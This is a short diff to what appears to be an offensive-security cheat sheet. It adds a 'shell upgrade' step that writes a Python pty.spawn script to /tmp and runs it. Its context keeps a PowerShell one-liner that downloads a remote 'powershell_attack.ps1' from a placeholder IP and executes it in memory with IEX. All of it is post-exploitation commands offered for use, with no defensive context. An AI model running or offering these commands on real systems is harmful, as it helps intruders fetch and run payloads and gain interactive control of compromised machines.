@@ -1,3 +1,10 @@
+
+##UPGRADE SHELL##
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+python /tmp/asdf.py
+
+
+
 ##Powershell download HTTP##
 powershell "IEX(New-Object Net.Webclient).downloadString('http://xx.xx.xx.x:xxx/powershell_attack.ps1')"
 
